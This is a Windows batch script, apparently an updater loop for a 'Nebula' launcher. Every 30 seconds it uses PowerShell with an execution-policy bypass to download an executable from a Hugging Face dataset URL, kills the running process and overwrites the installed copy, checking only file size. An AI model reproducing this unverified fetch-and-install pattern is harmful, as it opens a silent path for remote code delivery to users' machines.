@echo off
chcp 65001 >nul
title Nebula Updater Loop

setlocal EnableExtensions EnableDelayedExpansion

:: =====================
:: CONFIG
:: =====================
set "URL=https://huggingface.co/datasets/qwdqdqwe/system-gier/resolve/main/Nebulauncher.exe"
set "FILE=%TEMP%\nebula.exe"
set "INSTALL=%ProgramFiles(x86)%\NebulaLauncher\Nebulauncher.exe"

set "INTERVAL=30"

echo [INFO] Updater LOOP START
echo [INFO] Interval: %INTERVAL%s
echo.

:LOOP
echo [CHECK] Sprawdzam update...

:: =====================
:: DOWNLOAD (FIXED)
:: =====================
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$ProgressPreference='SilentlyContinue'; try { Invoke-WebRequest -Uri '%URL%' -OutFile '%FILE%' -UseBasicParsing } catch { exit 1 }"

if not exist "%FILE%" (
    echo [ERROR] Download failed
    goto WAIT
)

:: =====================
:: SIZE CHECK
:: =====================
for %%F in ("%FILE%") do set "SIZE=%%~zF"
echo [INFO] Size: !SIZE! bytes

if !SIZE! LSS 1000000 (
    echo [WARN] File too small → skip
    del /F /Q "%FILE%" >nul 2>&1
    goto WAIT
)

:: =====================
:: INSTALL DIR CHECK
:: =====================
if not exist "%ProgramFiles(x86)%\NebulaLauncher" (
    mkdir "%ProgramFiles(x86)%\NebulaLauncher" >nul 2>&1
)

:: =====================
:: VERSION CHECK
:: =====================
if exist "%INSTALL%" (
    for %%F in ("%INSTALL%") do set "OLD=%%~zF"

    if !OLD! NEQ !SIZE! (
        echo [UPDATE] Nowa wersja wykryta!

        taskkill /IM Nebulauncher.exe /F >nul 2>&1
        timeout /t 2 /nobreak >nul

        copy /Y "%FILE%" "%INSTALL%" >nul 2>&1

        echo [OK] Zaktualizowano
    ) else (
        echo [OK] Aktualna wersja
    )
) else (
    echo [FIRST] Instalacja pierwsza
    copy /Y "%FILE%" "%INSTALL%" >nul 2>&1
)

:: =====================
:: CLEANUP
:: =====================
del /F /Q "%FILE%" >nul 2>&1

:WAIT
timeout /t %INTERVAL% /nobreak >nul
goto LOOP
